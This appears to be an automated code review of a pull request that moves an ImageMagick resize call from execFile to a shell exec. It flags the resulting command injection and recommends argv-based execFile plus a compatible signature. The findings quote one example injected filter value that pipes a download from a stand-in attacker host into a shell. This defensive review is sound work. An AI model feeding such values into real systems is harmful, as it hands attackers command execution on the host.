findings.body:
**Claimed critical; verifier found:** verifier off

`exec()` runs the command through a shell, and both `src` and `filter` are interpolated into the string. The PR states filters are user-composed: a value such as `Lanczos; curl evil.test | sh` or a `src` containing `"` executes arbitrary commands on the runner/host.

Quoting `"${src}"` does not close the hole — embedded quotes and `$()` still break out. ImageMagick does not need a shell for `-filter`; keep `execFile` and pass argv:

```suggestion
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) => e ? rej(e) : res("/tmp/out.png"));
```

Also restore `import { execFile } from "child_process";`. If filters must be restricted, allowlist known ImageMagick filter names before invoking convert.

`resize(src, w)` is now `resize(src, filter, w)`. Existing callers that still pass `(src, width)` will treat the numeric width as `filter` and leave `w` undefined, producing a broken convert command (`-resize undefinedx`) or a TypeScript compile error at call sites outside this repo.

If this library has external consumers, add the filter as an optional trailing parameter or an options object, and keep a compatibility overload for `(src, w)`.

summary:
## Verdict

Critical command-injection regression in `resize()` — do not merge until the shell invocation is removed.

## Narrative

This PR switches ImageMagick invocation from `execFile` (argv array, no shell) to `exec` (shell string) and interpolates `src`, `filter`, and `w` directly into the command line. The new `filter` parameter is documented as user-composed, so any caller that forwards request or config input gives an attacker full shell on the host.

Double-quoting `src` does not make this safe: a path containing `"` still breaks out of the quoted segment. `filter` is unquoted entirely, so metacharacters (`;`, `|`, `$(...)`, backticks) run as shell syntax. ImageMagick filter names do not require a shell; pass `-filter` and the filter value as separate `execFile`/`spawn` arguments.

Secondary note: inserting `filter` as the second parameter is a breaking signature change for any external callers of this exported function.

**Recommendation:** request-changes
